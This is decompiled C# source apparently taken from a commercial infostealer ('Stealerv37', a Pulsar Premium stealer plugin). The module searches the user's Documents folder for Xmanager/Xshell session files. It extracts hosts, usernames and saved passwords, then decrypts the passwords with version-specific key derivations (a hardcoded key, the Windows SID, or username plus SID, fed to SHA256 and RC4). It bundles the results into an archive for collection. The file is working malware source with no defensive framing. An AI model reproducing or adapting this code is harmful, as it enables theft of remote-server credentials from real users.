// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.Xmanager
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Applications;

public class Xmanager : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string sid = WindowsIdentity.GetCurrent().User.ToString();
    List<string> source = this.Search(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal)));
    ConcurrentBag<string> lines = new ConcurrentBag<string>();
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Xmanager);
    Action<string> body = (Action<string>) (sessionFile =>
    {
      List<string> stringList = this.ReadConfigFile(sessionFile);
      if (stringList.Count < 4)
        return;
      string ver = stringList[0]?.Trim() ?? "";
      string str = stringList[1] ?? "";
      string username = stringList[2] ?? "";
      string rawPass = stringList[3] ?? "";
      lines.Add($"{$"{$"{$"{$"  Version : {ver}\n"}  Host    : {str}\n"}  User    : {username}\n"}  RawPass : {rawPass}\n"}  Decrypted: {this.DecryptToString(username, sid, rawPass, ver)}\n\n");
      counterApplications.Files.Add(sessionFile + " => Xmanager\\sessions.txt");
    });
    Parallel.ForEach<string>((IEnumerable<string>) source, body);
    if (!lines.Any<string>())
      return;
    string entryPath = "Xmanager\\sessions.txt";
    zip.AddTextFile(entryPath, string.Concat((IEnumerable<string>) lines));
    counterApplications.Files.Add(entryPath);
    counter.Applications.Add(counterApplications);
  }

  private List<string> Search(DirectoryInfo root)
  {
    List<string> stringList = new List<string>();
    if (!root.Exists)
      return stringList;
    Stack<DirectoryInfo> directoryInfoStack = new Stack<DirectoryInfo>();
    directoryInfoStack.Push(root);
    while (directoryInfoStack.Count > 0)
    {
      DirectoryInfo directoryInfo = directoryInfoStack.Pop();
      try
      {
        foreach (FileSystemInfo file in directoryInfo.GetFiles())
        {
          string fullName = file.FullName;
          if (fullName.EndsWith(".xsh", StringComparison.OrdinalIgnoreCase) || fullName.EndsWith(".xfp", StringComparison.OrdinalIgnoreCase))
            stringList.Add(fullName);
        }
        foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
          directoryInfoStack.Push(directory);
      }
      catch
      {
      }
    }
    return stringList;
  }

  private List<string> ReadConfigFile(string path)
  {
    string input = File.ReadAllText(path);
    string str1 = Regex.Match(input, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
    string str2 = Regex.Match(input, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
    string str3 = Regex.Match(input, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
    string str4 = Regex.Match(input, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
    List<string> stringList = new List<string>()
    {
      str1,
      str2,
      str3
    };
    if (!string.IsNullOrEmpty(str4) && str4.Length > 3)
      stringList.Add(str4);
    return stringList;
  }

  private string DecryptToString(string username, string sid, string rawPass, string ver)
  {
    byte[] sourceArray = Convert.FromBase64String(rawPass);
    byte[] key = ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2") ? new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&")) : (ver.StartsWith("5.1") || ver.StartsWith("5.2") ? new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid)) : (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0") ? new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username + sid)) : new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(new string(((IEnumerable<char>) (new string(((IEnumerable<char>) username.ToCharArray()).Reverse<char>().ToArray<char>()) + sid).ToCharArray()).Reverse<char>().ToArray<char>())))));
    byte[] numArray = new byte[sourceArray.Length - 32 /*0x20*/];
    Array.Copy((Array) sourceArray, 0, (Array) numArray, 0, numArray.Length);
    byte[] bytes = RC4Crypt.Decrypt(key, numArray);
    return bytes == null ? string.Empty : Encoding.ASCII.GetString(bytes);
  }
}
